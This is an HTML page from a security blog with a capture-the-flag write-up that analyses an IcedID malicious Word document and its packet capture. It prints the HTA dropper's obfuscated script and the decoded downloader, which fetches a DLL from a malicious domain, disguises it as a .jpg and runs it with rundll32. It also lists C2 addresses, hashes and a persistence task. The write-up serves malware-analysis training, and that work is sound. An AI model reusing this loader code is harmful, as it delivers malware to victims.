@@ -1,0 +1,498 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    
+      <title>
+        IceID Malicious Doc Analysis ::
+        1d8 blog — A simple theme for Hugo
+      </title>
+    
+    <meta http-equiv="content-type" content="text/html; charset=utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0" />
+<meta
+  name="description"
+  content="Let&amp;rsquo;s Defend IcedID Malware Family - https://app.letsdefend.io/challenge/IcedID-Malware-Family/
+ What is the sha256 hash for the malspam attachment?  cc721111b5924cfeb91440ecaccc60ecc30d10fffbdab262f7c0a17027f527d1
+This can be found by running sha256sum &amp;lt;malspam document&amp;gt; on Linux:
+What is the child process command line when the user enabled the Macro?  explorer.exe collectionBoxConst.hta
+Now that we have the malicious Word document, we can check it for macros using oleVBA to analyze the document. I am using Remnux&amp;rsquo;s VM which comes with oleVBA preinstalled, so I simply have to run:"
+/>
+<meta
+  name="keywords"
+  content=""
+/>
+<meta name="robots" content="noodp" />
+<link rel="canonical" href="https://1d8.github.io/writeups/iceiddocanalysis/" />
+
+
+
+
+
+
+
+<link rel="stylesheet" href="/css/style.css" />
+
+<link rel="stylesheet" href="https://1d8.github.io/style.css" />
+
+
+<link rel="apple-touch-icon-precomposed" sizes="144x144" href="https://1d8.github.io/img/apple-touch-icon-144-precomposed.png" />
+<link rel="shortcut icon" href="https://1d8.github.io/img/favicon.png" />
+
+
+<link href="/fonts/Inter-Italic.woff2" rel="preload" type="font/woff2" as="font" crossorigin="">
+<link href="/fonts/Inter-Regular.woff2" rel="preload" type="font/woff2" as="font" crossorigin="">
+<link href="/fonts/Inter-Medium.woff2" rel="preload" type="font/woff2" as="font" crossorigin="">
+<link href="/fonts/Inter-MediumItalic.woff2" rel="preload" type="font/woff2" as="font" crossorigin="">
+<link href="/fonts/Inter-Bold.woff2" rel="preload" type="font/woff2" as="font" crossorigin="">
+<link href="/fonts/Inter-BoldItalic.woff2" rel="preload" type="font/woff2" as="font" crossorigin="">
+
+
+<meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="IceID Malicious Doc Analysis"/>
+<meta name="twitter:description" content="Performing malware analysis on a malicious document from the IceID malware family."/>
+
+
+
+<meta property="og:title" content="IceID Malicious Doc Analysis" />
+<meta property="og:description" content="Performing malware analysis on a malicious document from the IceID malware family." />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://1d8.github.io/writeups/iceiddocanalysis/" /><meta property="article:section" content="writeups" />
+
+<meta property="og:site_name" content="1d8 blog" />
+
+
+
+
+
+
+
+  </head>
+  <body class="dark-theme">
+    <div class="container">
+      <header class="header">
+  <span class="header__inner">
+    <a
+  href="/"
+  class="logo"
+  style="text-decoration: none;"
+>
+  
+    <span class="logo__mark"><svg xmlns="http://www.w3.org/2000/svg" class="greater-icon" viewBox="0 0 44 44">
+  <path fill="none" d="M15 8l14.729 14.382L15 35.367" />
+</svg>
+</span>
+    <span class="logo__text"
+      >1d8 blog</span
+    >
+    <span class="logo__cursor"></span>
+  
+</a>
+
+    <span class="header__right">
+      
+        <nav class="menu">
+  <ul class="menu__inner menu__inner--desktop">
+    
+      
+        
+          <li><a href="/about">About</a></li>
+        
+      
+        
+          <li><a href="/cves">CVEs</a></li>
+        
+      
+        
+          <li><a href="/publications">Publications</a></li>
+        
+      
+        
+          <li><a href="/writeups">Writeups</a></li>
+        
+      
+      
+      
+  </ul>
+
+  <ul class="menu__inner menu__inner--mobile">
+    
+      
+        <li><a href="/about">About</a></li>
+      
+    
+      
+        <li><a href="/cves">CVEs</a></li>
+      
+    
+      
+        <li><a href="/publications">Publications</a></li>
+      
+    
+      
+        <li><a href="/writeups">Writeups</a></li>
+      
+    
+  </ul>
+</nav>
+
+        <span class="menu-trigger">
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
+            <path d="M0 0h24v24H0z" fill="none" />
+            <path d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z" />
+          </svg>
+        </span>
+      
+      <span class="theme-toggle">
+        <svg
+  class="theme-toggler"
+  width="24"
+  height="24"
+  viewBox="0 0 48 48"
+  fill="none"
+  xmlns="http://www.w3.org/2000/svg"
+>
+  <path
+    d="M22 41C32.4934 41 41 32.4934 41 22C41 11.5066 32.4934 3 22
+  3C11.5066 3 3 11.5066 3 22C3 32.4934 11.5066 41 22 41ZM7 22C7
+  13.7157 13.7157 7 22 7V37C13.7157 37 7 30.2843 7 22Z"
+  />
+</svg>
+
+      </span>
+    </span>
+  </span>
+</header>
+
+
+      <div class="content">
+        
+  
+  
+
+  <article class="post">
+    <h1 class="post-title">IceID Malicious Doc Analysis</h1>
+    <div class="post-meta">
+      
+
+      
+
+
+      
+        <span class="post-read-time"
+          >— 8 min read</span
+        >
+      
+    </div>
+
+    
+
+    
+      <figure class="post-cover">
+  
+    <img src="https://i.imgur.com/wpkiUaw.png" alt="IceID Malicious Doc Analysis"/>
+  
+
+  
+</figure>
+
+    
+
+    <div class="post-content">
+      
+      <p>Let&rsquo;s Defend IcedID Malware Family - <a href="https://app.letsdefend.io/challenge/IcedID-Malware-Family/">https://app.letsdefend.io/challenge/IcedID-Malware-Family/</a></p>
+<ol>
+<li>What is the sha256 hash for the malspam attachment?</li>
+</ol>
+<p><code>cc721111b5924cfeb91440ecaccc60ecc30d10fffbdab262f7c0a17027f527d1</code></p>
+<p>This can be found by running <code>sha256sum &lt;malspam document&gt;</code> on Linux:</p>
+<ol start="2">
+<li>What is the child process command line when the user enabled the Macro?</li>
+</ol>
+<p><code>explorer.exe collectionBoxConst.hta</code></p>
+<p>Now that we have the malicious Word document, we can check it for macros using <a href="https://github.com/decalage2/oletools/wiki/olevba">oleVBA</a> to analyze the document. I am using Remnux&rsquo;s VM which comes with <em>oleVBA</em> preinstalled, so I simply have to run:</p>
+<p><code>olevba doc.doc</code>:</p>
+<p>which outputs:</p>
+<p><img src="https://i.imgur.com/XbBugon.png" alt=""></p>
+<p><code>Sub autoopen()</code> is a function named <code>AutoOpen()</code>, and it&rsquo;ll be executed as soon as the victim enables macros on the malicious document.</p>
+<p>So when the victim enables macros, <code>Shell</code> will execute <code>explorer.exe collectionBoxConst.hta</code> which opens the <code>.hta</code> file. We have the <code>.hta</code> file referenced here and will analyze it further in the next tasks.</p>
+<ol start="3">
+<li>What is the HTML Application file&rsquo;s sha256 hash from previous question?</li>
+</ol>
+<p><code>8062bf9248451706c9c2007e1772e51268f299d5253cbd9ef327dd829c51755b</code></p>
+<p>This can be found by running <code>sha256sum &lt;HTML Application Filename&gt;.hta</code></p>
+<ol start="4">
+<li>Based on the previous question, what is the DLL run method?</li>
+</ol>
+<p><code>&quot;C:\Windows\System32\rundll32.exe&quot; c:\users\public\collectionBoxConst.jpg,PluginInit</code></p>
+<p>Now we&rsquo;re asked to give the DLL run method, so we know there&rsquo;s a DLL file associated with the <code>collectionBoxConst.hta</code> file somehow.</p>
+<p>The content of the <code>collectionBoxConst.hta</code> file is:</p>
+<p><img src="https://i.imgur.com/KYyvfmI.png" alt=""></p>
+<p>And here is a text representation:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-html" data-lang="html">html&gt;
+body&gt;
+div id=&#39;copyCurrencyMemory&#39;&gt;fX17KWUoaGN0YWN9O2Vzb2xjLnRzTHJhdjspMiAsImdwai50c25vQ3hvQm5vaXRjZWxsb2NcXGNpbGJ1cFxcc3Jlc3VcXDpjIihlbGlmb3RldmFzLnRzTHJhdjspeWRvYmVzbm9wc2VyLlJyZWdldG5JZXRhZChldGlydy50c0xyYXY7MSA9IGVweXQudHNMcmF2O25lcG8udHNMcmF2OykibWFlcnRzLmJkb2RhIih0Y2VqYk9YZXZpdGNBIHdlbiA9IHRzTHJhdiByYXZ7eXJ0eykwMDIgPT0gc3V0YXRzLlJyZWdldG5JZXRhZChmaTspKGRuZXMuUnJlZ2V0bklldGFkOyllc2xhZiAsIkNYTWpPb0dUNDJDV2JNNzZzMWN3RD1xJjA5TWtubFF2WkdCQUYyRGRGUlZ5TDEyZ2dWWnU9aGNyYWVzJlQyOTJEb01IbT1yZXN1JmZwNHJWPWRpJnllRFBPWGREUDZJNGhXeDlqaD1xJm5mVWcwczladENhVnk9dUp3Uzl5OWkmSmk4bjJLMT1lZ2FwJm5GdmVJckh5NUZMWjExWFV5RDRnY2JvcTA9ZW1pdCZ2YmZrSXNSbmE9cmVzdT81ZXNvcy9OUElyR2drUDZSQUFIVlZLQ2NlUngwVlZCNlR1dEx6emlOUUovN1lXeGlRQWtPbk9CeDUvVC9hZGRhL21vYy56ZXJ1bGNjbWVzcnVvYy8vOnB0dGgiICwiVEVHIihuZXBvLlJyZWdldG5JZXRhZDspInB0dGhsbXguMmxteHNtIih0Y2VqYk9YZXZpdGNBIHdlbiA9IFJyZWdldG5JZXRhZCByYXY=aGVsbG8fXspdHhlTnhlZG5JeGVkbmkoaGN0YWN9Oyl0Y2VqYk9Wb3BlcihlbGlmZXRlbGVkLnRjdXJ0U0xzZXR5YjsiYXRoLnRzbm9DeG9Cbm9pdGNlbGxvY1xcIiArIHlyb3RjZXJpRHRuZXJydUMudHNub0NlY25lcmVmZVJ0c3VydCA9IHRjZWpiT1ZvcGVye3lydDspInRpbkluaWd1bFAsZ3BqLnRzbm9DeG9Cbm9pdGNlbGxvY1xcY2lsYnVwXFxzcmVzdVxcOmMgMjNsbGRudXIiKG51ci50c25vQ2VjbmVyZWZlUnRzdXJ0OykidGNlamJvbWV0c3lzZWxpZi5nbml0cGlyY3MiKHRjZWpiT1hldml0Y0Egd2VuID0gdGN1cnRTTHNldHliIHJhdjspImxsZWhzLnRwaXJjc3ciKHRjZWpiT1hldml0Y0Egd2VuID0gdHNub0NlY25lcmVmZVJ0c3VydCByYXY=aGVsbG8msscriptcontrol.scriptcontrol&lt;/<span style="color:#f92672">div</span>&gt;&lt;<span style="color:#f92672">div</span> <span style="color:#a6e22e">id</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#39;vConstBorder&#39;</span>&gt;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&lt;/<span style="color:#f92672">div</span>&gt;
+
+script language=&#39;javascript&#39;&gt;
+function WLongPtr(altListVba){return(new ActiveXObject(altListVba));}function objButtBool(headerListbox){return(removeConstFunction.getElementById(headerListbox).innerHTML);}function boolOptionClass(){return(objButtBool(&#39;vConstBorder&#39;));}function sinBooleanCur(s){var e={}; var i; var b=0; var c; var x; var l=0; var a; var memSetByte=&#39;&#39;; var w=String.fromCharCode; var L=s.length;var intBorder = zeroI(&#39;tArahc&#39;);for(i=0;i&lt;<span style="color:#f92672">64</span><span style="color:#960050;background-color:#1e0010">;</span><span style="color:#a6e22e">i</span><span style="color:#960050;background-color:#1e0010">++){</span><span style="color:#a6e22e">e</span><span style="color:#960050;background-color:#1e0010">[</span><span style="color:#a6e22e">boolOptionClass</span><span style="color:#960050;background-color:#1e0010">()[</span><span style="color:#a6e22e">intBorder</span><span style="color:#960050;background-color:#1e0010">](</span><span style="color:#a6e22e">i</span><span style="color:#960050;background-color:#1e0010">)]=</span><span style="color:#a6e22e">i</span><span style="color:#960050;background-color:#1e0010">;}</span><span style="color:#a6e22e">for</span><span style="color:#960050;background-color:#1e0010">(</span><span style="color:#a6e22e">x</span><span style="color:#f92672">=</span><span style="color:#e6db74">0;x&lt;L;x++){c=e[s[intBorder](x)];b=(b&lt;&lt;6)+c;l+=6;while(l</span>&gt;=8){((a=(b&gt;&gt;&gt;(l-=8))&amp;0xff)||(x&lt;(L-2)))&amp;&amp;(memSetByte+=w(a));}}return(memSetByte);};function zeroI(genTempTextbox){return genTempTextbox.split(&#39;&#39;).reverse().join(&#39;&#39;);}procDocumentI = window;removeConstFunction = document;procDocumentI.resizeTo(1, 1);procDocumentI.moveTo(-100, -100);var genericBoolean = removeConstFunction.getElementById(&#39;copyCurrencyMemory&#39;).innerHTML.split(&#34;aGVsbG8&#34;);var collectRightSingle = zeroI(sinBooleanCur(genericBoolean[0]));var vData = zeroI(sinBooleanCur(genericBoolean[1]));var viewPointerConvert = genericBoolean[2];
+/script&gt;
+
+script language=&#39;vbscript&#39;&gt;Function classResponseLocal(copyCurrencyMemory) : Set snglSngTpl = CreateObject(viewPointerConvert) : With snglSngTpl : .language = &#34;jscript&#34; : .timeout = 60000 : .eval(copyCurrencyMemory) : End With : End Function
+
+/script&gt;
+script language=&#39;vbscript&#39;&gt;Call classResponseLocal(collectRightSingle)
+/script&gt;
+
+script language=&#39;vbscript&#39;&gt;Call classResponseLocal(vData)<span style="color:#960050;background-color:#1e0010">&lt;</span>/script script language=&#39;javascript&#39;&gt;procDocumentI[&#39;close&#39;]();
+/script&gt;
+/body&gt;
+/html&gt;
+</code></pre></div><p>We can see that there&rsquo;s a large base64 string, but if we try to decode it all at once, we get gibberish mixed with garbage data:</p>
+<p><img src="https://i.imgur.com/c1LgzZZ.png" alt=""></p>
+<p>But if we look deeper at the Javascript of the HTML, we can determine that the base64 encoded data is being split by <code>aGVsbG8</code>, which means this is meant to separate 2 base64 encoded data chunks.</p>
+<ul>
+<li>If we decode <code>aGVsbG8</code>, it is <em>hello</em> (:</li>
+</ul>
+<p>So if we don&rsquo;t include the <code>aGVsbG8</code> string and instead split the base64 chunks on this string, we end up with these 2 chunks:</p>
+<ol>
+<li><code>fX17KWUoaGN0YWN9O2Vzb2xjLnRzTHJhdjspMiAsImdwai50c25vQ3hvQm5vaXRjZWxsb2NcXGNpbGJ1cFxcc3Jlc3VcXDpjIihlbGlmb3RldmFzLnRzTHJhdjspeWRvYmVzbm9wc2VyLlJyZWdldG5JZXRhZChldGlydy50c0xyYXY7MSA9IGVweXQudHNMcmF2O25lcG8udHNMcmF2OykibWFlcnRzLmJkb2RhIih0Y2VqYk9YZXZpdGNBIHdlbiA9IHRzTHJhdiByYXZ7eXJ0eykwMDIgPT0gc3V0YXRzLlJyZWdldG5JZXRhZChmaTspKGRuZXMuUnJlZ2V0bklldGFkOyllc2xhZiAsIkNYTWpPb0dUNDJDV2JNNzZzMWN3RD1xJjA5TWtubFF2WkdCQUYyRGRGUlZ5TDEyZ2dWWnU9aGNyYWVzJlQyOTJEb01IbT1yZXN1JmZwNHJWPWRpJnllRFBPWGREUDZJNGhXeDlqaD1xJm5mVWcwczladENhVnk9dUp3Uzl5OWkmSmk4bjJLMT1lZ2FwJm5GdmVJckh5NUZMWjExWFV5RDRnY2JvcTA9ZW1pdCZ2YmZrSXNSbmE9cmVzdT81ZXNvcy9OUElyR2drUDZSQUFIVlZLQ2NlUngwVlZCNlR1dEx6emlOUUovN1lXeGlRQWtPbk9CeDUvVC9hZGRhL21vYy56ZXJ1bGNjbWVzcnVvYy8vOnB0dGgiICwiVEVHIihuZXBvLlJyZWdldG5JZXRhZDspInB0dGhsbXguMmxteHNtIih0Y2VqYk9YZXZpdGNBIHdlbiA9IFJyZWdldG5JZXRhZCByYXY=</code></li>
+<li><code>fXspdHhlTnhlZG5JeGVkbmkoaGN0YWN9Oyl0Y2VqYk9Wb3BlcihlbGlmZXRlbGVkLnRjdXJ0U0xzZXR5YjsiYXRoLnRzbm9DeG9Cbm9pdGNlbGxvY1xcIiArIHlyb3RjZXJpRHRuZXJydUMudHNub0NlY25lcmVmZVJ0c3VydCA9IHRjZWpiT1ZvcGVye3lydDspInRpbkluaWd1bFAsZ3BqLnRzbm9DeG9Cbm9pdGNlbGxvY1xcY2lsYnVwXFxzcmVzdVxcOmMgMjNsbGRudXIiKG51ci50c25vQ2VjbmVyZWZlUnRzdXJ0OykidGNlamJvbWV0c3lzZWxpZi5nbml0cGlyY3MiKHRjZWpiT1hldml0Y0Egd2VuID0gdGN1cnRTTHNldHliIHJhdjspImxsZWhzLnRwaXJjc3ciKHRjZWpiT1hldml0Y0Egd2VuID0gdHNub0NlY25lcmVmZVJ0c3VydCByYXY=</code></li>
+</ol>
+<p>And if we decode both, we end up with:</p>
+<ol>
+<li><code>}}{)e(hctac};esolc.tsLrav;)2 ,&quot;gpj.tsnoCxoBnoitcelloc\\cilbup\\sresu\\:c&quot;(elifotevas.tsLrav;)ydobesnopser.RregetnIetad(etirw.tsLrav;1 = epyt.tsLrav;nepo.tsLrav;)&quot;maerts.bdoda&quot;(tcejbOXevitcA wen = tsLrav rav{yrt{)002 == sutats.RregetnIetad(fi;)(dnes.RregetnIetad;)eslaf ,&quot;CXMjOoGT42CWbM76s1cwD=q&amp;09MknlQvZGBAF2DdFRVyL12ggVZu=hcraes&amp;T292DoMHm=resu&amp;fp4rV=di&amp;yeDPOXdDP6I4hWx9jh=q&amp;nfUg0s9ZtCaVy=uJwS9y9i&amp;Ji8n2K1=egap&amp;nFveIrHy5FLZ11XUyD4gcboq0=emit&amp;vbfkIsRna=resu?5esos/NPIrGgkP6RAAHVVKCceRx0VVB6TutLzziNQJ/7YWxiQAkOnOBx5/T/adda/moc.zerulccmesruoc//:ptth&quot; ,&quot;TEG&quot;(nepo.RregetnIetad;)&quot;ptthlmx.2lmxsm&quot;(tcejbOXevitcA wen = RregetnIetad</code></li>
+<li><code>}{)txeNxednIxedni(hctac};)tcejbOVoper(elifeteled.tcurtSLsetyb;&quot;ath.tsnoCxoBnoitcelloc\\&quot; + yrotceriDtnerruC.tsnoCecnerefeRtsurt = tcejbOVoper{yrt;)&quot;tinInigulP,gpj.tsnoCxoBnoitcelloc\\cilbup\\sresu\\:c 23lldnur&quot;(nur.tsnoCecnerefeRtsurt;)&quot;tcejbometsyselif.gnitpircs&quot;(tcejbOXevitcA wen = tcurtSLsetyb rav;)&quot;llehs.tpircsw&quot;(tcejbOXevitcA wen = tsnoCecnerefeRtsurt rav</code></li>
+</ol>
+<p>More seemingly garbage data, but if you look closely, you&rsquo;ll notice that there appears to be a file path in both strings. And if you read through the Javascript within the <code>.hta</code> file, you&rsquo;ll also notice that in addition to splitting the data on <code>aGVsbG8</code>, it also reverses the data chunks, so it&rsquo;s simply backwards.</p>
+<p>We can replicate this in Python by running:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python3" data-lang="python3">print(garbageString[::<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>])
+</code></pre></div><p>where <code>garbageString</code> is our backwards data. This will result in:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-Javascript" data-lang="Javascript"><span style="color:#a6e22e">dateIntegerR</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">ActiveXObject</span>(<span style="color:#e6db74">&#34;msxml2.xmlhttp&#34;</span>);<span style="color:#a6e22e">dateIntegerR</span>.<span style="color:#a6e22e">open</span>(<span style="color:#e6db74">&#34;GET&#34;</span>, <span style="color:#e6db74">&#34;hxxp //coursemcclurez.com/adda/T/5xBOnOkAQixWY7/JQNizzLtuT6BVV0xRecCKVVHAAR6PkgGrIPN/sose5?user=anRsIkfbv&amp;time=0qobcg4DyUX11ZLF5yHrIevFn&amp;page=1K2n8iJ&amp;i9y9SwJu=yVaCtZ9s0gUfn&amp;q=hj9xWh4I6PDdXOPDey&amp;id=Vr4pf&amp;user=mHMoD292T&amp;search=uZVgg21LyVRFdD2FABGZvQlnkM90&amp;q=Dwc1s67MbWC24TGoOjMXC&#34;</span>, <span style="color:#66d9ef">false</span>);<span style="color:#a6e22e">dateIntegerR</span>.<span style="color:#a6e22e">send</span>();<span style="color:#66d9ef">if</span>(<span style="color:#a6e22e">dateIntegerR</span>.<span style="color:#a6e22e">status</span> <span style="color:#f92672">==</span> <span style="color:#ae81ff">200</span>){<span style="color:#66d9ef">try</span>{<span style="color:#66d9ef">var</span> <span style="color:#a6e22e">varLst</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">ActiveXObject</span>(<span style="color:#e6db74">&#34;adodb.stream&#34;</span>);<span style="color:#a6e22e">varLst</span>.<span style="color:#a6e22e">open</span>;<span style="color:#a6e22e">varLst</span>.<span style="color:#a6e22e">type</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span>;<span style="color:#a6e22e">varLst</span>.<span style="color:#a6e22e">write</span>(<span style="color:#a6e22e">dateIntegerR</span>.<span style="color:#a6e22e">responsebody</span>);<span style="color:#a6e22e">varLst</span>.<span style="color:#a6e22e">savetofile</span>(<span style="color:#e6db74">&#34;c:\users\public\collectionBoxConst.jpg&#34;</span>, <span style="color:#ae81ff">2</span>);<span style="color:#a6e22e">varLst</span>.<span style="color:#a6e22e">close</span>;}<span style="color:#66d9ef">catch</span>(<span style="color:#a6e22e">e</span>){}}
+
+<span style="color:#a6e22e">trustReferenceConst</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">ActiveXObject</span>(<span style="color:#e6db74">&#34;wscript.shell&#34;</span>);<span style="color:#66d9ef">var</span> <span style="color:#a6e22e">bytesLStruct</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">ActiveXObject</span>(<span style="color:#e6db74">&#34;scripting.filesystemobject&#34;</span>);<span style="color:#a6e22e">trustReferenceConst</span>.<span style="color:#a6e22e">run</span>(<span style="color:#e6db74">&#34;rundll32 c:\users\public\collectionBoxConst.jpg,PluginInit&#34;</span>);<span style="color:#66d9ef">try</span>{<span style="color:#a6e22e">repoVObject</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">trustReferenceConst</span>.<span style="color:#a6e22e">CurrentDirectory</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;\collectionBoxConst.hta&#34;</span>;<span style="color:#a6e22e">bytesLStruct</span>.<span style="color:#a6e22e">deletefile</span>(<span style="color:#a6e22e">repoVObject</span>);}<span style="color:#66d9ef">catch</span>(<span style="color:#a6e22e">indexIndexNext</span>){}
+</code></pre></div><p>The first half will:</p>
+<ul>
+<li>Make a GET request to hxxp //coursemcclurez.com/adda/T/5xBOnOkAQixWY7/JQNizzLtuT6BVV0xRecCKVVHAAR6PkgGrIPN/sose5?user=anRsIkfbv&amp;time=0qobcg4DyUX11ZLF5yHrIevFn&amp;page=1K2n8iJ&amp;i9y9SwJu=yVaCtZ9s0gUfn&amp;q=hj9xWh4I6PDdXOPDey&amp;id=Vr4pf&amp;user=mHMoD292T&amp;search=uZVgg21LyVRFdD2FABGZvQlnkM90&amp;q=Dwc1s67MbWC24TGoOjMXC</li>
+<li>Then save the response data from the GET request to a file located at <code>C:\Users\Public\collectionBoxConst.jpg</code></li>
+</ul>
+<p>The second half will:</p>
+<ul>
+<li>Execute the commandline: <code>rundll32 C:\Users\Public\collectionBoxConst.jpg,PluginInit</code></li>
+<li>Delete the <code>collectionBoxConst.hta</code> file</li>
+</ul>
+<p>The apparent <code>.jpg</code> file clearly isn&rsquo;t a <code>.jpg</code> file, but rather a <em>Dynamic Link Library</em> (<code>.dll</code>) file. This can further be confirmed by running the <code>file</code> utility on the file, which returns:</p>
+<p><code>PE32+ executable (DLL) (GUI) x86-64, for MS Windows</code></p>
+<ol start="5">
+<li>What is the image file dll installer sha256 hash from previous question?</li>
+</ol>
+<p><code>51658887e46c88ed6d5861861a55c989d256a7962fb848fe833096ed6b049441</code></p>
+<p>This question is referring to the <code>.dll</code> file with the <code>.jpg</code> file extension which was downloaded.</p>
+<p>We can determine the sha256 hash by running this command in Linux:</p>
+<p><code>sha256sum &lt;filename&gt;.dll</code></p>
+<ol start="6">
+<li>What are the IP address and its domain name hosted installer DLL?</li>
+</ol>
+<p><code>45.142.213.105, coursemcclurez.com</code></p>
+<p>This question is asking about the domain and IP address that the <code>collectionBoxConst.dll</code> file was downloaded from. Recall that the full URL was:</p>
+<p><code>hxxp //coursemcclurez.com/adda/T/5xBOnOkAQixWY7/JQNizzLtuT6BVV0xRecCKVVHAAR6PkgGrIPN/sose5?user=anRsIkfbv&amp;time=0qobcg4DyUX11ZLF5yHrIevFn&amp;page=1K2n8iJ&amp;i9y9SwJu=yVaCtZ9s0gUfn&amp;q=hj9xWh4I6PDdXOPDey&amp;id=Vr4pf&amp;user=mHMoD292T&amp;search=uZVgg21LyVRFdD2FABGZvQlnkM90&amp;q=Dwc1s67MbWC24TGoOjMXC</code></p>
+<p>So we know the domain is: <code>coursemcclurez[.]com</code></p>
+<p>And if we input this into VirusTotal:</p>
+<p><img src="https://i.imgur.com/WYUneba.png" alt=""></p>
+<p>Now we have the IP address!</p>
+<ol start="7">
+<li>What is the full URL for the DLL installer?</li>
+</ol>
+<p><code>hxxp //coursemcclurez.com/adda/T/5xBOnOkAQixWY7/JQNizzLtuT6BVV0xRecCKVVHAAR6PkgGrIPN/sose5?user=anRsIkfbv&amp;time=0qobcg4DyUX11ZLF5yHrIevFn&amp;page=1K2n8iJ&amp;i9y9SwJu=yVaCtZ9s0gUfn&amp;q=hj9xWh4I6PDdXOPDey&amp;id=Vr4pf&amp;user=mHMoD292T&amp;search=uZVgg21LyVRFdD2FABGZvQlnkM90&amp;q=Dwc1s67MbWC24TGoOjMXC</code></p>
+<ol start="8">
+<li>What are the two IP addresses identified as C2 servers?</li>
+</ol>
+<p><code>185.33.85.35, 194.5.249.46</code></p>
+<p>If we filter for only <code>dns</code> packets in the packet capture, we can see that there&rsquo;s a lot more domains than the <code>coursemcclurez[.]com</code> being queried:</p>
+<p><img src="https://i.imgur.com/oP2qPoQ.png" alt=""></p>
+<p>Many of the domains are being resolved to the IP address <code>185.33.85.35</code>, and we were already aware of the <code>45.142.213.105</code> domain which is associated to <code>coursemcclurez[.]com</code>.</p>
+<p>This only leaves 3 other potential C2 server IP addresses:</p>
+<ul>
+<li><code>172.67.169.59</code></li>
+<li><code>194.5.249.46</code></li>
+<li><code>65.8.218.70</code></li>
+</ul>
+<p>The two which appear suspicious due to the domains they&rsquo;re associated with are <code>172.67.169.59</code> (<code>supplementik[.]top</code>) &amp; <code>194.5.249.46</code> (<code>extrimefigim[.]top</code>)</p>
+<p>After trying both IP addresses as answers, only <code>194.5.249.46</code> was accepted.</p>
+<ol start="9">
+<li>What are the four C2 domains identified in the PCAP file?</li>
+</ol>
+<p><code>arhannexa5.top, extrimefigim.top, fimlubindu.top, kilodaser4.fit</code></p>
+<p>We know that the C2 IP addresses are <code>185.33.85.35</code> &amp; <code>194.5.249.46</code>, so now we simply have to look through the captured DNS packets and search for domain queries which resolved to either of these C2 IP addresses. We can type <em>dns</em> into the search filter to only look at DNS packets:</p>
+<p><img src="https://i.imgur.com/OL2cSk0.png" alt=""></p>
+<ol start="10">
+<li>After the DLL installer being executed, what are the two domains that were being contacted by the installer DLL?</li>
+</ol>
+<p><code>aws.amazon.com, supplementik.top</code></p>
+<p>To solve this, we must look for when the DLL installer was downloaded, then look at the packets after this event occurred. We know that the domain that the DLL installer was downloaded from is <code>coursemcclurez[.]com</code>, and we know that the machine must request the IP address for this domain before it can download the DLL or contact the domain for anything, so we can start by looking for the packet which answered this DNS query packet, then looking at the packets after that DNS query was resolved:</p>
+<p><img src="https://i.imgur.com/GMiVLBP.png" alt=""></p>
+<p>Now we know that in packet 2, the DNS query is resolved. Now we can assume that after packet 2, the DLL is now downloaded and that every DNS query after packet 2 is going to occur after the DLL is executed.</p>
+<p>We see there&rsquo;s 2 more DNS queries:</p>
+<p><img src="https://i.imgur.com/fL1yaoN.png" alt=""></p>
+<p><img src="https://i.imgur.com/P9LVBUN.png" alt=""></p>
+<p>One for <code>aws.amazon[.]com</code> &amp; another for <code>supplementik[.]top</code>, both of which we can assume occurred after the DLL was downloaded and executed.</p>
+<ol start="11">
+<li>The malware generated traffic to an IP address over port 8080 with two SYN requests, what is the IP address?</li>
+</ol>
+<p><code>38.135.122.194</code></p>
+<p>This can be solved by looking at the <code>.pcap</code> capture file and entering: <code>tcp.port == 8080</code> as a display filter which outputs:</p>
+<p><img src="https://i.imgur.com/wtBK8ey.png" alt=""></p>
+<p>And if we scroll through the packets displayed, we can determine that the only IP addresses associated with any communications on port 8080 are between <code>10.6.2.103</code> (The source) and <code>38.135.122.194</code> (The destination).</p>
+<ol start="12">
+<li>The license.dat file was used to create persistance on the user&rsquo;s machine, what is the dll run method for the persistance?</li>
+</ol>
+<p><code>C:\Users\user1\AppData\Local\user1\Tetoomdu64.dll&quot;,update /i:&quot;ComicFantasy\license.dat</code></p>
+<p>The contents of <code>2021-06-02-scheduled-task.txt</code> will point us in the correct direction for this question:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-xml" data-lang="xml"><span style="color:#75715e">&lt;?xml version=&#34;1.0&#34; encoding=&#34;UTF-16&#34;?&gt;</span>
+<span style="color:#f92672">&lt;Task</span> <span style="color:#a6e22e">version=</span><span style="color:#e6db74">&#34;1.2&#34;</span> <span style="color:#a6e22e">xmlns=</span><span style="color:#e6db74">&#34;http://schemas.microsoft.com/windows/2004/02/mit/task&#34;</span><span style="color:#f92672">&gt;</span>
+  <span style="color:#f92672">&lt;RegistrationInfo&gt;</span>
+    <span style="color:#f92672">&lt;URI&gt;</span>\{B9C2BAC4-FDCF-449C-896A-9BEA1C23FBE8}<span style="color:#f92672">&lt;/URI&gt;</span>
+  <span style="color:#f92672">&lt;/RegistrationInfo&gt;</span>
+  <span style="color:#f92672">&lt;Triggers&gt;</span>
+    <span style="color:#f92672">&lt;TimeTrigger</span> <span style="color:#a6e22e">id=</span><span style="color:#e6db74">&#34;TimeTrigger&#34;</span><span style="color:#f92672">&gt;</span>
